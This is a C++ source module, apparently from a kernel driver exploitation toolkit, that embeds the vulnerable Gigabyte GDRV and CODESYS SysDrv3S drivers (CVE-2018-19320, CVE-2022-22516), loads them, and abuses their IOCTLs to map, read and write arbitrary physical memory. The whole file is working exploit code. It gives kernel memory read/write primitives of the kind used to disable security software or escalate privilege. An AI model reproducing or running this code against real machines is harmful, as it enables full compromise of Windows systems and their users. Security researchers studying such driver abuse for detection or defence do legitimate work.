/* MAPMEM driver exploit - Supports GDRV, SYSDRV3S, and other MAPMEM-based drivers */

#include <windows.h>
#include <cstdint>
#include <expected>
#include <memory>
#include <print>
#include <string>
#include <vector>

#include "../../core/kdu_core.h"

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// External symbols from bin2obj
extern "C" {
    extern const uint8_t _binary_gdrv_bin_start[];
    extern const uint8_t _binary_gdrv_bin_end[];
    extern const uint8_t _binary_sysdrv3s_bin_start[];
    extern const uint8_t _binary_sysdrv3s_bin_end[];
}

namespace kdu::exploits {

// IOCTL definitions for GDRV
#define GDRV_DEVICE_TYPE (DWORD)0xC350
#define GDRV_VIRTUALTOPHYSICAL (DWORD)0xA03
#define GRV_IOCTL_INDEX (DWORD)0x800

#define IOCTL_GDRV_VIRTUALTOPHYSICAL \
    CTL_CODE(GDRV_DEVICE_TYPE, GDRV_VIRTUALTOPHYSICAL, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY \
    CTL_CODE(GDRV_DEVICE_TYPE, GRV_IOCTL_INDEX + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY \
    CTL_CODE(GDRV_DEVICE_TYPE, GRV_IOCTL_INDEX + 2, METHOD_BUFFERED, FILE_ANY_ACCESS)

// IOCTL definitions for CODESYS SYSDRV3S (MAPMEM)
#define FILE_DEVICE_MAPMEM (DWORD)0x00008000
#define MAPMEM_IOCTL_INDEX (DWORD)0x800

#define IOCTL_MAPMEM_MAP_USER_PHYSICAL_MEMORY \
    CTL_CODE(FILE_DEVICE_MAPMEM, MAPMEM_IOCTL_INDEX, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_MAPMEM_UNMAP_USER_PHYSICAL_MEMORY \
    CTL_CODE(FILE_DEVICE_MAPMEM, MAPMEM_IOCTL_INDEX + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Structures
#pragma pack(push, 1)
typedef struct _GIO_VIRTUAL_TO_PHYSICAL {
    ULARGE_INTEGER Address;
} GIO_VIRTUAL_TO_PHYSICAL;

typedef struct _MAPMEM_PHYSICAL_MEMORY_INFO {
    ULONG InterfaceType;
    ULONG BusNumber;
    LARGE_INTEGER BusAddress;
    ULONG AddressSpace;
    ULONG Length;
} MAPMEM_PHYSICAL_MEMORY_INFO;
#pragma pack(pop)

// Helper function
static BOOL CallDriver(HANDLE hDevice, DWORD dwIoControlCode,
                      LPVOID lpInBuffer, DWORD nInBufferSize,
                      LPVOID lpOutBuffer, DWORD nOutBufferSize) {
    DWORD dwBytesReturned = 0;
    return DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize,
                          lpOutBuffer, nOutBufferSize, &dwBytesReturned, nullptr);
}

// Base MAPMEM exploit class supporting both GDRV and SYSDRV3S IOCTLs
class MapMemExploit : public core::DriverExploit,
                      public core::IPhysicalMemoryRead,
                      public core::IPhysicalMemoryWrite,
                      public core::QueryPML4FromPhysicalMixin<MapMemExploit>,
                      public core::V2PFromPhysicalMixin<MapMemExploit>,
                      public core::VirtualFromPhysicalMixin<MapMemExploit> {
protected:
    DWORD map_ioctl_;
    DWORD unmap_ioctl_;
    DWORD v2p_ioctl_;
    bool supports_v2p_;

public:
    explicit MapMemExploit(HANDLE device_handle, std::wstring name,
                          DWORD map_ioctl, DWORD unmap_ioctl, 
                          DWORD v2p_ioctl = 0, bool supports_v2p = false)
        : DriverExploit(device_handle, std::move(name)),
          map_ioctl_(map_ioctl),
          unmap_ioctl_(unmap_ioctl),
          v2p_ioctl_(v2p_ioctl),
          supports_v2p_(supports_v2p) {}

    std::expected<std::vector<uint8_t>, std::string>
    try_read_physical_memory(uintptr_t physical_address, size_t size) const noexcept override {
        try {
            std::vector<uint8_t> buffer(size);
            
            MAPMEM_PHYSICAL_MEMORY_INFO request{};
            PVOID pMapSection = nullptr;
            ULONG_PTR offset = physical_address & ~(PAGE_SIZE - 1);
            ULONG mapSize = (ULONG)((physical_address - offset) + size);

            request.BusAddress.QuadPart = offset;
            request.Length = mapSize;

            if (!CallDriver(device_handle_, map_ioctl_,
                          &request, sizeof(request), &pMapSection, sizeof(PVOID))) {
                return std::unexpected("Failed to map physical memory");
            }

            if (!pMapSection) {
                return std::unexpected("Mapping returned null");
            }

            ULONG_PTR readOffset = physical_address - offset;
            memcpy(buffer.data(), (PBYTE)pMapSection + readOffset, size);

            CallDriver(device_handle_, unmap_ioctl_,
                      &pMapSection, sizeof(PVOID), nullptr, 0);

            return buffer;
        } catch (...) {
            return std::unexpected("Exception in read_physical_memory");
        }
    }

    std::expected<void, std::string>
    try_write_physical_memory(uintptr_t physical_address, const void* data, size_t size) noexcept override {
        try {
            MAPMEM_PHYSICAL_MEMORY_INFO request{};
            PVOID pMapSection = nullptr;
            ULONG_PTR offset = physical_address & ~(PAGE_SIZE - 1);
            ULONG mapSize = (ULONG)((physical_address - offset) + size);

            request.BusAddress.QuadPart = offset;
            request.Length = mapSize;

            if (!CallDriver(device_handle_, map_ioctl_,
                          &request, sizeof(request), &pMapSection, sizeof(PVOID))) {
                return std::unexpected("Failed to map physical memory");
            }

            if (!pMapSection) {
                return std::unexpected("Mapping returned null");
            }

            ULONG_PTR writeOffset = physical_address - offset;
            memcpy((PBYTE)pMapSection + writeOffset, data, size);

            CallDriver(device_handle_, unmap_ioctl_,
                      &pMapSection, sizeof(PVOID), nullptr, 0);

            return {};
        } catch (...) {
            return std::unexpected("Exception in write_physical_memory");
        }
    }
};

// GDRV specific provider
class GdrvProvider : public core::IDriverProvider {
public:
    GdrvProvider() {
        size_t driver_size = _binary_gdrv_bin_end - _binary_gdrv_bin_start;
        
        metadata_.driver_name = "gdrv";
        metadata_.device_name = "\\\\.\\GIO";
        metadata_.service_name = "gdrv";
        metadata_.description = "Gigabyte GDRV (CVE-2018-19320)";
        metadata_.cve_id = "CVE-2018-19320";
        metadata_.driver_data = _binary_gdrv_bin_start;
        metadata_.driver_size = driver_size;
        metadata_.capabilities = 
            core::AbilityFlags::PhysicalMemoryRead |
            core::AbilityFlags::PhysicalMemoryWrite |
            core::AbilityFlags::VirtualMemoryRead |
            core::AbilityFlags::VirtualMemoryWrite |
            core::AbilityFlags::VirtualToPhysical |
            core::AbilityFlags::QueryPML4 |
            core::AbilityFlags::MapPhysicalMemory |
            core::AbilityFlags::UnmapPhysicalMemory;
    }

    std::expected<void, std::string> check_available() const noexcept override {
        HANDLE hDevice = CreateFileW(
            std::wstring(metadata_.device_name.begin(), metadata_.device_name.end()).c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0, nullptr, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, nullptr);
        
        if (hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
            return {};
        }
        
        if (!metadata_.driver_data || metadata_.driver_size == 0) {
            return std::unexpected("Driver binary not embedded");
        }
        
        return {};
    }

    std::expected<std::unique_ptr<core::DriverExploit>, std::string>
    create_instance() noexcept override {
        std::wstring service_name(metadata_.service_name.begin(), 
                                 metadata_.service_name.end());
        std::wstring device_name(metadata_.device_name.begin(), 
                                metadata_.device_name.end());
        
        auto result = load_driver_from_memory(
            metadata_.driver_data,
            metadata_.driver_size,
            service_name,
            device_name
        );
        
        if (!result) {
            return std::unexpected(result.error());
        }
        
        return std::make_unique<MapMemExploit>(
            *result, L"gdrv",
            IOCTL_GDRV_MAP_USER_PHYSICAL_MEMORY,
            IOCTL_GDRV_UNMAP_USER_PHYSICAL_MEMORY,
            IOCTL_GDRV_VIRTUALTOPHYSICAL,
            true
        );
    }
};

// SYSDRV3S specific provider
class SysDrv3SProvider : public core::IDriverProvider {
public:
    SysDrv3SProvider() {
        size_t driver_size = _binary_sysdrv3s_bin_end - _binary_sysdrv3s_bin_start;
        
        metadata_.driver_name = "SysDrv3S";
        metadata_.device_name = "\\\\.\\SysDrv3S";
        metadata_.service_name = "SysDrv3S";
        metadata_.description = "CODESYS SysDrv3S (CVE-2022-22516)";
        metadata_.cve_id = "CVE-2022-22516";
        metadata_.driver_data = _binary_sysdrv3s_bin_start;
        metadata_.driver_size = driver_size;
        metadata_.capabilities = 
            core::AbilityFlags::PhysicalMemoryRead |
            core::AbilityFlags::PhysicalMemoryWrite |
            core::AbilityFlags::VirtualMemoryRead |
            core::AbilityFlags::VirtualMemoryWrite |
            core::AbilityFlags::QueryPML4 |
            core::AbilityFlags::MapPhysicalMemory |
            core::AbilityFlags::UnmapPhysicalMemory;
    }

    std::expected<void, std::string> check_available() const noexcept override {
        HANDLE hDevice = CreateFileW(
            std::wstring(metadata_.device_name.begin(), metadata_.device_name.end()).c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0, nullptr, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, nullptr);
        
        if (hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
            return {};
        }
        
        if (!metadata_.driver_data || metadata_.driver_size == 0) {
            return std::unexpected("Driver binary not embedded");
        }
        
        return {};
    }

    std::expected<std::unique_ptr<core::DriverExploit>, std::string>
    create_instance() noexcept override {
        std::wstring service_name(metadata_.service_name.begin(), 
                                 metadata_.service_name.end());
        std::wstring device_name(metadata_.device_name.begin(), 
                                metadata_.device_name.end());
        
        auto result = load_driver_from_memory(
            metadata_.driver_data,
            metadata_.driver_size,
            service_name,
            device_name
        );
        
        if (!result) {
            return std::unexpected(result.error());
        }
        
        return std::make_unique<MapMemExploit>(
            *result, L"sysdrv3s",
            IOCTL_MAPMEM_MAP_USER_PHYSICAL_MEMORY,
            IOCTL_MAPMEM_UNMAP_USER_PHYSICAL_MEMORY,
            0,  // No V2P IOCTL for SYSDRV3S
            false
        );
    }
};

// Auto-register providers
static core::ProviderRegistrar<GdrvProvider> gdrv_reg;
static core::ProviderRegistrar<SysDrv3SProvider> sysdrv3s_reg;

}  // namespace kdu::exploits
